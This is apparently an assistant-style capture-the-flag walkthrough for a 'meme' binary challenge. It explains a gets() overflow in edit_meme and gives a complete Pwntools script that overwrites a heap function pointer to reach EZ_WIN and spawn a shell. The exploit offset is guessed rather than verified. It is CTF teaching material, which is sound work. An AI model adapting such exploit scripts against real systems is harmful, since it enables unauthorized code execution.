@@ -1,0 +1,106 @@
+To solve this challenge using Pwntools, you need to exploit the buffer overflow vulnerability in the `edit_meme()` function. The `gets()` function used in `edit_meme()` does not limit the input size, allowing you to overflow the allocated meme content buffer and overwrite the function pointer in the meme structure. By overwriting this function pointer with the address of the `EZ_WIN()` function or the `system("/bin/sh")`, you can get a shell when the program subsequently calls the overwritten function pointer.
+
+Here's how you can approach this challenge step by step:
+
+1. **Understand the Vulnerability:**
+   - The `new_meme()` function allocates a meme structure and a content buffer. The meme structure (`v4`) is allocated with `malloc(8)` but stores 16 bytes (`v4[0]` and `v4[1]`), leading to a heap overflow.
+   - The `edit_meme()` function uses `gets()` to read input into the content buffer without size checks, allowing a buffer overflow.
+
+2. **Plan Your Exploit:**
+   - Use the `edit_meme()` function to overflow the content buffer and overwrite the function pointer in the meme structure.
+   - Overwrite the function pointer with the address of `EZ_WIN()` or `system("/bin/sh")`.
+
+3. **Write the Pwntools Exploit Script:**
+
+Here's the step-by-step code with explanations:
+
+```python
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.binary = './int'
+e = ELF('./int')
+
+# Start the process (or remote connection if provided)
+p = process('./int')
+
+def new_meme(size, content):
+    p.sendlineafter('Choice: ', '1')  # Select "New Meme"
+    p.sendlineafter('Enter meme size: ', str(size))
+    p.sendlineafter('Enter meme content: ', content)
+    p.recvuntil('Done!')  # Wait for confirmation
+
+def edit_meme(index, content):
+    p.sendlineafter('Choice: ', '2')  # Select "Edit Meme"
+    p.sendlineafter('Index: ', str(index))
+    p.sendlineafter('Enter meme content: ', content)
+    p.recvuntil('Done!')
+
+def print_meme(index):
+    p.sendlineafter('Choice: ', '3')  # Select "Print Meme"
+    p.sendlineafter('Index: ', str(index))
+
+def exploit():
+    # Step 1: Create a new meme with a small size
+    new_meme(8, 'AAAAAAA')  # Index 0
+
+    # Step 2: Overwrite the function pointer of the meme
+    # Calculate the offset to the function pointer based on the buffer size and architecture
+    # For 64-bit systems, the function pointer is 8 bytes
+    # Since the content buffer is 8 bytes, we'll need to write 8 bytes to fill it, and then overwrite the function pointer
+
+    # Prepare the payload
+    padding = b'A' * 24  # Adjust the padding based on experimentation
+    EZ_WIN = e.symbols['EZ_WIN']  # Get the address of EZ_WIN
+    payload = padding + p64(EZ_WIN)  # Overwrite the function pointer with EZ_WIN's address
+
+    # Step 3: Edit the meme to overflow and overwrite the function pointer
+    edit_meme(0, payload)
+
+    # Step 4: Trigger the overwritten function pointer by printing the meme
+    print_meme(0)
+
+    # Step 5: Interact with the shell
+    p.interactive()
+
+if __name__ == '__main__':
+    exploit()
+```
+
+**Explanation of the Exploit Steps:**
+
+- **Creating a New Meme:**
+  - We create a meme with a small size (e.g., 8 bytes) to ensure that the content buffer is small and adjacent to the function pointer in memory.
+- **Preparing the Payload:**
+  - The payload consists of padding to fill the content buffer and reach the function pointer, followed by the address of `EZ_WIN()`.
+  - We use `p64(EZ_WIN)` to pack the address correctly for a 64-bit system.
+- **Editing the Meme:**
+  - We use the `edit_meme()` function, which utilizes `gets()`, to input our payload. Since `gets()` does not limit input, it allows us to overflow the content buffer and overwrite the function pointer.
+- **Triggering the Overwritten Function Pointer:**
+  - We select the `print_meme()` function to call the overwritten function pointer, which now points to `EZ_WIN()`.
+- **Getting a Shell:**
+  - Once `EZ_WIN()` is called, it executes `system("/bin/sh")`, giving us a shell.
+
+4. **Test and Adjust the Exploit:**
+   - Depending on the actual memory layout, you may need to adjust the padding size in the payload.
+   - Use tools like GDB to debug the program and find the exact offset between the content buffer and the function pointer.
+
+5. **Run the Exploit:**
+   - Execute your exploit script, and you should get a shell.
+
+**Notes:**
+
+- **ASLR and Protections:**
+  - If the binary has Address Space Layout Randomization (ASLR) enabled or other protections like stack canaries, you may need additional steps to bypass them.
+- **Remote Exploitation:**
+  - If exploiting remotely, ensure you adjust the script to connect to the remote service and handle any differences.
+- **Understanding the Heap Layout:**
+  - Heap exploitation can be complex due to memory allocator behavior. If overwriting the function pointer directly doesn't work, consider exploiting the heap metadata or leveraging techniques like tcache poisoning.
+
+**Conclusion:**
+
+By exploiting the buffer overflow in `edit_meme()` to overwrite the function pointer in the meme structure, you can redirect execution flow to the `EZ_WIN()` function and get a shell. Pwntools provides the necessary tools to interact with the binary, craft the payload, and automate the exploitation process.
+
+---
+
+**Remember:** Always ensure you have permission to test and exploit binaries, and use this knowledge ethically and responsibly.
